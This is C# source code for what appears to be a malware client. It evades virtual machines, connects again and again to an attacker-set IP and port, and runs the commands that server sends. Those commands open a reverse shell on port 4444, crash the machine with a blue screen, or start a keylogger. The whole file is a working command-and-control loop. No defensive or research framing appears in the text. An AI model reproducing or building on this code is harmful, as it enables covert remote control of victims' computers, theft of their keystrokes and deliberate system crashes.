using System.Net.Sockets;
using mw.funcs;
using mw.utils;
using mw.settings;
namespace mw
{
    class mainProgram
    {
        static void Main(string[] args)
        {   

            if(Settings.quit_on_vm) {
                if (mal_funcs.isVM()) {
                    return;
                }
            }


            

            









            
            

            while(true) {

                try{

                    Console.WriteLine("Connecting to " + Settings.ip + ":" + Settings.port);
                    connecttohost(Settings.ip, Settings.port); 

                } catch (Exception e) {

                    //check if e is a socket exception
                    if (e.GetType() == typeof(SocketException)) {

                        //host is down. wait 60 seconds and try to connect again
                        Console.WriteLine("Host is down. Waiting 60 seconds and trying to connect again.");
                        System.Threading.Thread.Sleep(60000);

                    }
                    else {

                        Console.WriteLine(e.Message);
                        break;

                    }

                }

            }






        }






        //replace with better implementation
        static void connecttohost(string ip, int port) {
            //create a stream to
            using (TcpClient client = new TcpClient(ip, port)) {
                using (NetworkStream stream = client.GetStream()) {
                    //create a stream to the server
                    using (StreamReader reader = new StreamReader(stream)) {
                        using (StreamWriter writer = new StreamWriter(stream)) {
                            //read the server's response
                            string response = reader.ReadLine();
                            Console.WriteLine(response);
                            //send a message to the server
                            writer.WriteLine("Hello World!");
                            writer.Flush();
                            //read the server's response

                            while (true) {
                                if(reader.EndOfStream) {
                                    break;
                                }
                                response = reader.ReadLine();
                                switch (response) {
                                    case "exit":
                                        return;
                                    case "revSh":
                                        writer.WriteLine("creating revSh to port 4444");
                                        mal_funcs.revSh();
                                        break;
                                    case "bsod":
                                        mal_funcs.bsod();
                                        break;
                                    case "keylogger":
                                        mal_funcs.keylogger();
                                        break;
                                }
                            }
                        }
                    }
                }
            }
        }


    }
}
